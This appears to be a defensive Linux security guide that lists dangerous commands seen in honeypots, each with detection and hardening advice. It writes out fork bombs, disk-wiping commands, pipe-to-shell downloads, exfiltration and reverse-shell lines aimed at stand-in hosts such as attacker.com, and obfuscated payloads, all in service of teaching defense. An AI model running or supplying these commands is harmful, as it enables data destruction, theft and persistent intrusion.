# Dangerous Linux Commands from Honeypot Analysis

## Overview

This document catalogs dangerous commands observed in honeypot logs and common attack patterns used by malicious actors attempting to compromise systems.

**⚠️ WARNING: DO NOT RUN THESE COMMANDS ⚠️**

These examples are for educational purposes only to understand attack vectors and improve security posture.

---

## 1. Fork Bombs - Resource Exhaustion

### Command:
```bash
:(){ :|:& };:
```

**Why it's dangerous:**
- Creates a recursive function that spawns infinite processes
- Consumes all available system resources (CPU, memory, PIDs)
- System becomes unresponsive in seconds
- Requires hard reboot to recover

**Defense:**
- Set `ulimit -u` limits in `/etc/security/limits.conf`
- Monitor process counts with system monitoring tools

---

## 2. Recursive Deletion

### Commands:
```bash
rm -rf / --no-preserve-root
rm -rf /*
sudo dd if=/dev/zero of=/dev/sda
```

**Why they're dangerous:**
- Deletes entire filesystem starting from root
- `--no-preserve-root` bypasses safety check
- `dd` overwrites disk with zeros, destroying all data
- Unrecoverable without backups

**Defense:**
- Restrict root access
- Use `sudo` with whitelisted commands only
- Enable filesystem immutable flags on critical files: `chattr +i`

---

## 3. Memory/Disk Fill Attacks

### Commands:
```bash
cat /dev/zero > /dev/null &
dd if=/dev/zero of=/fillfile bs=1M
:(){ echo "data" >> /tmp/file; $0; }
```

**Why they're dangerous:**
- Fills disk space rapidly
- Causes system instability
- Prevents logging and normal operations
- Can trigger service failures

**Defense:**
- Disk quotas per user
- Monitor disk usage with alerts
- Tmpfs size limits

---

## 4. Malicious Downloads and Execution

### Commands:
```bash
curl http://malicious-site.com/script.sh | bash
wget -qO- http://attacker.com/payload | sh
curl -s http://bad-actor.net/miner | sudo bash
```

**Why they're dangerous:**
- Executes arbitrary code from untrusted sources
- Bypasses file inspection
- Often installs cryptominers, backdoors, or ransomware
- Runs with shell privileges (potentially root with sudo)

**Defense:**
- Inspect scripts before execution
- Download first: `curl -O`, then review, then execute
- Use checksums/signatures for legitimate scripts
- Firewall egress filtering

---

## 5. Backdoor Installation

### Commands:
```bash
echo "attacker_key" >> ~/.ssh/authorized_keys
echo "* * * * * curl attacker.com/beacon" | crontab -
nc -lvp 4444 -e /bin/bash
```

**Why they're dangerous:**
- Adds attacker's SSH key for persistent access
- Creates cron job for command & control beacon
- Opens reverse shell for remote access
- Maintains persistence after initial compromise

**Defense:**
- Monitor `authorized_keys` changes
- Audit crontabs regularly
- Restrict outbound connections
- Use `aide` or similar for file integrity monitoring

---

## 6. Privilege Escalation Attempts

### Commands:
```bash
sudo su -
echo 'evil ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
chmod u+s /bin/bash
```

**Why they're dangerous:**
- Attempts to gain root access
- Modifies sudoers to grant unrestricted access
- Sets SUID bit on bash for privilege escalation
- Permanent backdoor for privilege elevation

**Defense:**
- Use `visudo` only (validates syntax)
- Monitor `/etc/sudoers` and `/etc/sudoers.d/`
- Audit SUID binaries: `find / -perm -4000 2>/dev/null`

---

## 7. Data Exfiltration

### Commands:
```bash
tar czf - /etc /home | curl -X POST -d @- http://attacker.com/data
cat /etc/passwd | nc attacker.com 9999
find / -name "*.pdf" -exec curl -F file=@{} attacker.com/upload \;
```

**Why they're dangerous:**
- Steals sensitive configuration files
- Exfiltrates user data and credentials
- Sends documents to attacker-controlled servers
- Often goes unnoticed without egress monitoring

**Defense:**
- Egress firewall rules
- Data Loss Prevention (DLP) tools
- Network traffic monitoring
- Encrypt sensitive files at rest

---

## 8. Process Hiding and Rootkits

### Commands:
```bash
echo "LD_PRELOAD=/tmp/evil.so" >> /etc/environment
mount -o bind /fake-ps /bin/ps
insmod /tmp/rootkit.ko
```

**Why they're dangerous:**
- `LD_PRELOAD` hijacks library loading
- Replaces system binaries with compromised versions
- Kernel modules can hide processes and files
- Makes detection extremely difficult

**Defense:**
- Use `rkhunter` or `chkrootkit` regularly
- Enable kernel module signing
- Use `checksec` and binary verification
- Monitor `/proc` and `/sys` for anomalies

---

## 9. Network Attacks from Compromised Host

### Commands:
```bash
hping3 -S --flood -V target-ip
nmap -sS -p- target-network
arpspoof -i eth0 -t victim gateway
```

**Why they're dangerous:**
- Launches DDoS attacks from your IP
- Scans networks for vulnerable hosts
- ARP poisoning for man-in-the-middle attacks
- Makes your system liable for attacks

**Defense:**
- Egress filtering
- Rate limiting on network interfaces
- Intrusion Detection Systems (IDS)
- Disable unnecessary network tools in production

---

## 10. Cryptominer Installation

### Commands:
```bash
curl -sL https://raw.github.com/miner/xmrig/install.sh | bash
nohup /tmp/.hidden-miner --donate-level 0 &
nice -n 19 /usr/local/bin/miner --cpu 80% &
```

**Why they're dangerous:**
- Consumes CPU resources for cryptocurrency mining
- Increases electricity costs
- Degrades system performance
- Often bundled with other malware

**Defense:**
- Monitor CPU usage patterns
- Check for unknown processes
- Network monitoring for mining pool connections
- Block mining pool domains at firewall

---

## Obfuscation Techniques

Attackers disguise malicious commands so victims can't easily identify them. Here are common obfuscation methods:

### 1. Base64 Encoding
```bash
# Hidden fork bomb
echo "OigpeyA6fDomIH07Ogo=" | base64 -d | bash

# What it decodes to: :(){ :|:& };:
```

### 2. Hex Encoding
```bash
# Hidden malicious command
echo -e "\x3a\x28\x29\x7b\x20\x3a\x7c\x3a\x26\x20\x7d\x3b\x3a" | bash
```

### 3. Variable Obfuscation
```bash
# Breaks up the command into variables
a=":";b="(";c=")";d="{";e=" ";f=":";g="|";h="&";i="}";j=";"
$a$b$c$d$e$f$g$f$h$e$i$j$a
```

### 4. URL Encoding in Downloaded Scripts
```bash
# Script from URL looks innocent but contains encoded payloads
curl -s http://attacker.com/innocent-looking-script.sh | bash

# The script might contain:
# eval "$(echo %3a%28%29%7b%20%3a%7c%3a%26%20%7d%3b%3a | sed 's/%/\\x/g')"
```

### 5. Compression + Encoding
```bash
# Compressed and base64 encoded
echo "H4sIAAAAAAAAA0vOz0lVyE0sSk7NTU4vSk7VTU5MyclPV0jOzytJzStRBADUxc5xGgAAAA==" | base64 -d | gunzip | bash
```

### 6. Using Character Substitution
```bash
# Using unicode or special characters that look similar
# Uses greek question mark (;) instead of semicolon
:(){ :|:& }​;:  # <- Contains hidden unicode character
```

### 7. Heredoc with Eval
```bash
eval "$(cat <<'EOF'
:(){ :|:& };:
EOF
)"
```

### 8. Reverse String
```bash
# Command written backwards then reversed
echo ":;}& :|: {):" | rev | bash
```

### 9. Command Substitution Nesting
```bash
$(echo -n : ; echo '(){ :|:& };:') | bash
```

### 10. Downloaded Script with Innocent Name
```bash
# File named "update-security.sh" but contains:
#!/bin/bash
# Security Update Script v1.2
# Checking system...
sleep 2
echo "Applying security patches..."
sleep 1

# Hidden in middle of script:
eval "$(printf '\x3a\x28\x29\x7b\x20\x3a\x7c\x3a\x26\x20\x7d\x3b\x3a')"

echo "Update complete!"
```

### 11. Environment Variable Abuse
```bash
export PROMPT_COMMAND=':(){ :|:& };:'
# Executes every time prompt is displayed
```

### 12. Whitespace/Comment Hiding
```bash
#!/bin/bash
# Long legitimate-looking script
# ... 300 lines of normal commands ...
:(){                    # Innocent comment about function
  :|:&                  # More innocent comments
};:                     # End of function
# ... more legitimate code ...
```

### How to Detect Obfuscation

#### Suspicious Patterns:
```bash
# Look for these red flags in scripts:

# 1. Base64 decode piped to bash
grep -E "base64.*bash|bash.*base64" script.sh

# 2. Eval with encoded content
grep -E "eval.*echo|eval.*printf" script.sh

# 3. Hex escapes (\x)
grep -E "\\\\x[0-9a-f]{2}" script.sh

# 4. Curl/wget piped directly to shell
grep -E "curl.*bash|wget.*sh" script.sh

# 5. Rev, od, xxd with bash
grep -E "rev.*bash|xxd.*bash" script.sh
```

#### Safe Script Review Process:
```bash
# 1. Download but DON'T execute
curl -o script.sh http://source.com/script.sh

# 2. Check file type
file script.sh

# 3. Look for suspicious patterns
grep -E "base64|eval|exec|\\\\x" script.sh

# 4. Decode any base64 WITHOUT executing
grep "base64" script.sh | sed 's/.*base64 -d//' | base64 -d

# 5. Use shellcheck for static analysis
shellcheck script.sh

# 6. Run in isolated container first
docker run --rm -it ubuntu bash -c "$(cat script.sh)"
```

---

## Execution Without Explicit Bash Commands

### Can malicious code run just by reading a file?

**Generally NO** - but there are dangerous edge cases:

### 1. Shell Configuration Files (Auto-execution)
```bash
# If attacker modifies these files, code runs automatically:

~/.bashrc          # Runs every time you open a terminal
~/.bash_profile    # Runs on login
~/.profile         # Runs on login
~/.bash_aliases    # Sourced by .bashrc

# Example attack:
echo ":(){ :|:& };:" >> ~/.bashrc
# Now EVERY new terminal executes the fork bomb
```

**Protection:**
```bash
# Monitor these files
sudo auditctl -w /home/*/.bashrc -p wa -k bashrc_changes
```

### 2. PROMPT_COMMAND Variable
```bash
# Executes before every prompt display
export PROMPT_COMMAND=':(){ :|:& };:'

# Or hidden in .bashrc:
PROMPT_COMMAND='curl -s http://attacker.com/beacon'
```

**This runs automatically** every time your prompt appears - no explicit bash needed!

### 3. Terminal Escape Sequences (Less common, but possible)
```bash
# Malicious terminal sequences can:
# - Change your prompt to include commands
# - Remap keyboard keys
# - Inject commands into your terminal buffer

# Example (DON'T RUN):
echo -e "\033]0;$(malicious command)\007"
```

**Protection:**
- Use terminal emulators that sanitize escape sequences
- Be careful with untrusted text in terminals

### 4. LD_PRELOAD and Shared Libraries
```bash
# If attacker modifies these, code runs with EVERY program:

/etc/ld.so.preload           # Loaded before any program runs
~/.bashrc with LD_PRELOAD    # Hijacks library loading

# Example:
echo "/tmp/malicious.so" > /etc/ld.so.preload
# Now EVERY command (ls, cat, etc.) runs malicious code first
```

### 5. Aliases (Appears safe, but isn't)
```bash
# Attacker redefines common commands in your .bashrc:

alias ls=':(){ :|:& };: #'
alias cd='curl attacker.com/beacon; cd'
alias sudo='curl attacker.com/passwords; sudo'

# When you type "ls", you run the fork bomb instead
```

### 6. Function Definitions in Environment
```bash
# Shellshock vulnerability (CVE-2014-6271)
# Bash functions in environment variables could execute code

env 'BASH_FUNC_x()=() { :;}; :(){ :|:& };:' bash -c "echo test"
# Code after function definition executes automatically
```

**Fixed in modern bash, but shows the concept**

### 7. File Sourcing (Looks innocent)
```bash
# If you have in your .bashrc:
source ~/useful-scripts.sh

# And attacker modifies useful-scripts.sh:
# The malicious code runs every terminal session
```

### 8. SSH Authorized Keys with Forced Commands
```bash
# In ~/.ssh/authorized_keys, attacker adds:
command=":(){ :|:& };:" ssh-rsa AAAAB3N... attacker@evil

# When they SSH in, command runs automatically
```

### 9. Cron Jobs (Silent execution)
```bash
# Attacker adds to your crontab:
* * * * * :(){ :|:& };:

# Runs every minute, no bash command needed from you
```

### 10. systemd User Services
```bash
# Attacker creates ~/.config/systemd/user/malicious.service:
[Unit]
Description=Innocent Service

[Service]
ExecStart=/bin/bash -c ':(){ :|:& };:'

[Install]
WantedBy=default.target

# Enables it:
systemctl --user enable malicious.service
# Runs on every login
```

---

## Real Answer: When is Reading Files Safe?

### SAFE - Just viewing:
```bash
cat file.txt          # Safe - just displays text
less file.txt         # Safe - just displays text
head file.txt         # Safe - just displays text
nano file.txt         # Safe - just editing
vim file.txt          # Safe - just editing
```

**These only READ - they don't execute**

### DANGEROUS - These execute code:
```bash
source file.txt       # EXECUTES as bash script
. file.txt            # EXECUTES as bash script (same as source)
bash file.txt         # EXECUTES as bash script
sh file.txt           # EXECUTES as shell script
eval "$(cat file.txt)" # EXECUTES content
chmod +x file.txt && ./file.txt  # Makes executable and runs
```

### SNEAKY DANGEROUS - Auto-execution:
```bash
# Opening terminal (if .bashrc modified)
# Logging in (if .profile modified)  
# Running any command (if LD_PRELOAD set)
# Typing aliased command (if .bash_aliases modified)
# Scheduled time (if crontab modified)
```

---

## Key Protection Principles

### 1. **Principle of Least Surprise**
If you're just reading a file with `cat`, `less`, or `vim` - **you're safe**.
Code CANNOT execute without an explicit execution command.

### 2. **Watch Auto-execution Files**
Monitor these files for unauthorized changes:
```bash
# Set up file integrity monitoring
sudo apt install aide
sudo aideinit

# Or use inotify
inotifywait -m -r -e modify ~/.bashrc ~/.bash_profile ~/.profile
```

### 3. **Audit Automation**
```bash
# Check what runs automatically:
crontab -l                    # Your cron jobs
systemctl --user list-units   # Your systemd services
cat ~/.bashrc                 # Shell startup
cat ~/.bash_profile           # Login shell
env | grep PROMPT_COMMAND     # Prompt execution
```

### 4. **Verify Before Sourcing**
```bash
# NEVER do this blindly:
source untrusted-file.sh

# ALWAYS inspect first:
cat untrusted-file.sh
# Then decide if safe to source
```

---

## Summary

**Direct answer to your question:**

**NO** - Just reading a file with `cat`, `less`, `head`, `tail`, or editing with `vim`/`nano` is **completely safe**. The text cannot execute.

**HOWEVER** - Malicious code CAN execute without you typing "bash" if:
1. It's in auto-run files (`.bashrc`, `.profile`)
2. It's in cron jobs
3. It's in systemd services
4. You use `source` or `.` command
5. It hijacks aliases or functions
6. It uses `LD_PRELOAD` or similar mechanisms

**The key:** The attacker needs to **trick you into executing** OR **get write access to auto-run files**. Simply viewing text is always safe.

---

## Common Attack Patterns Observed

### 1. Reconnaissance Phase
```bash
whoami
uname -a
cat /etc/os-release
ps aux
netstat -tulpn
```

### 2. Enumeration
```bash
find / -perm -4000 2>/dev/null
cat /etc/passwd
ls -la /home
crontab -l
```

### 3. Persistence
```bash
echo "@reboot /tmp/malware" | crontab -
cp /bin/bash /tmp/.hidden && chmod +s /tmp/.hidden
```

---

## Detection and Prevention Strategies

### Real-time Monitoring
```bash
# Monitor for suspicious processes
ps auxf | grep -E "(curl|wget|nc|nmap)" | grep -v grep

# Check for unusual network connections
ss -tnp | grep ESTABLISHED

# Review recent command history
lastlog
last -f /var/log/wtmp
```

### Security Hardening
```bash
# Disable unnecessary services
systemctl list-unit-files --state=enabled

# Check for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Review firewall rules
iptables -L -n -v
ufw status verbose
```

### Log Analysis
```bash
# Review auth logs
grep -i "failed\|failure\|invalid" /var/log/auth.log

# Check for privilege escalation attempts
grep -i "sudo\|su:" /var/log/auth.log

# Analyze SSH attempts
grep "sshd" /var/log/auth.log | grep "Failed"
```

---

## Recommended Security Tools

1. **fail2ban** - Automatic IP banning for repeated failed attempts
2. **rkhunter** - Rootkit detection
3. **aide** - File integrity monitoring
4. **ossec** - Host-based intrusion detection
5. **lynis** - Security auditing tool
6. **ufw/iptables** - Firewall management
7. **auditd** - Linux auditing framework

---

## Emergency Response

If you suspect compromise:

1. **Isolate** - Disconnect from network immediately
2. **Assess** - Check running processes, network connections
3. **Preserve** - Capture memory dump, disk image for forensics
4. **Eradicate** - Kill malicious processes, remove backdoors
5. **Recover** - Restore from known-good backup
6. **Review** - Analyze logs to determine attack vector

---

## The Persistence Attack Pattern (The Really Scary Part)

This is the attack flow that makes it so dangerous:

### Phase 1: Initial Compromise
```bash
# You run what looks like an innocent script:
curl -fsSL http://legitimate-looking-site.com/install.sh | bash

# Or SSH with weak password
# Or exploit a vulnerability
```

### Phase 2: Silent Persistence Installation
```bash
# The script does BOTH legitimate work AND malicious work:

#!/bin/bash
echo "Installing updates..."
apt update  # <- Legitimate

# Hidden in the middle:
echo '$(curl -s http://attacker.com/cmd.txt | bash)' >> ~/.bashrc
# ^ Now EVERY terminal runs attacker's commands

echo "Installation complete!"  # <- Looks successful
```

### Phase 3: You Never Notice
```bash
# Days/weeks/months later, every time you:
- Open a terminal -> Attacker's code runs
- SSH into the server -> Attacker's code runs
- Run a cron job -> Attacker's code runs

# Meanwhile the attacker:
- Steals data quietly
- Uses your server for crypto mining
- Uses your IP for attacks on others
- Installs more backdoors
```

### Why It's So Effective

1. **One-time compromise, permanent access**
   - You patch the initial vulnerability
   - But the backdoor remains in `.bashrc`
   - Attacker keeps access indefinitely

2. **Hidden in legitimate locations**
   ```bash
   # Your ~/.bashrc looks normal at first glance:
   # 50 lines of normal bash configuration
   # Line 51: PS1='\u@\h:\w\$ '
   # Line 52: $(curl -s http://tiny-url/x | bash)  # <- Easy to miss
   # 20 more lines of normal config
   ```

3. **Survives system updates**
   - OS updates don't touch user config files
   - Backdoor remains even after "full system update"

4. **Works across sessions**
   - Reboot doesn't remove it
   - New SSH sessions trigger it
   - Runs with YOUR permissions

### Real-World Attack Chain Example

```bash
# Step 1: Attacker compromises via vulnerable app
exploit-vulnerable-wordpress-plugin.sh

# Step 2: Escalate to shell access
wget http://attacker.com/reverse-shell.php -O /tmp/shell.php

# Step 3: Install persistence (this is the scary part)
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1 &' >> ~/.bashrc
echo '* * * * * curl -s attacker.com/beacon' | crontab -
mkdir -p ~/.ssh && echo "ssh-rsa AAAA...attacker-key" >> ~/.ssh/authorized_keys

# Step 4: Clean up evidence
rm /tmp/shell.php
history -c

# Step 5: Wait
# Now attacker has:
# - Backdoor in .bashrc (runs every terminal)
# - Cron job (runs every minute)
# - SSH key (direct access anytime)
```

### How To Check If You've Been Compromised

```bash
# 1. Check .bashrc for suspicious curl/wget commands
grep -E "curl|wget|nc|/dev/tcp" ~/.bashrc ~/.bash_profile ~/.profile

# 2. Look for suspicious cron jobs
crontab -l | grep -E "curl|wget|nc"

# 3. Check SSH authorized keys for unknown keys
cat ~/.ssh/authorized_keys

# 4. Look for suspicious systemd services
systemctl --user list-units --all | grep -v "loaded active"

# 5. Check for modifications to common files
stat ~/.bashrc ~/.bash_profile ~/.profile | grep Modify

# 6. Look for outbound connections
ss -tnp | grep ESTABLISHED

# 7. Check recently modified files in home directory
find ~ -type f -mtime -7 -ls | grep -E "bashrc|profile|ssh|cron"
```

### Defense Strategy: Defense in Depth

```bash
# 1. File Integrity Monitoring
# Alert on ANY changes to critical files
sudo apt install aide
sudo aide --init
sudo aide --check

# 2. Immutable Critical Files
# Prevent even root from modifying (until unset)
sudo chattr +i ~/.bashrc
sudo chattr +i ~/.bash_profile
# To modify legitimately: sudo chattr -i ~/.bashrc

# 3. Audit Logging
# Log all commands executed
echo 'export PROMPT_COMMAND="history -a; history -n"' >> ~/.bashrc
# Better: Use auditd for system-wide logging

# 4. Regular Audits
# Weekly/monthly review of:
- Crontab entries
- SSH authorized_keys
- Shell config files
- Running processes
- Network connections

# 5. Least Privilege
# Don't run services as root
# Use dedicated service accounts with minimal permissions

# 6. Network Segmentation
# Limit outbound connections from servers
sudo ufw default deny outgoing
sudo ufw allow out 80/tcp   # HTTP
sudo ufw allow out 443/tcp  # HTTPS
sudo ufw allow out 53/udp   # DNS
```

### The Scary Truth

**This is how major breaches happen:**

1. Initial compromise through vulnerability (Day 1)
2. Install persistence mechanisms (Day 1)
3. Company patches the vulnerability (Day 5)
4. Company thinks they're safe (Day 5)
5. **Attacker still has access via backdoor** (Day 5 - forever)
6. Data breach occurs months later (Day 180)
7. Investigation reveals: "But we patched that vulnerability!"

**The lesson:** Patching vulnerabilities is necessary but not sufficient. You must also:
- Hunt for persistence mechanisms
- Monitor for suspicious activity
- Audit all auto-execution points
- Assume breach and verify

---

## References

- MITRE ATT&CK Framework for Linux
- CIS Benchmarks for Linux Security
- NIST Cybersecurity Framework
- OWASP Security Guidelines

---

**Remember:** The best defense is layered security (defense in depth), regular updates, principle of least privilege, and continuous monitoring.
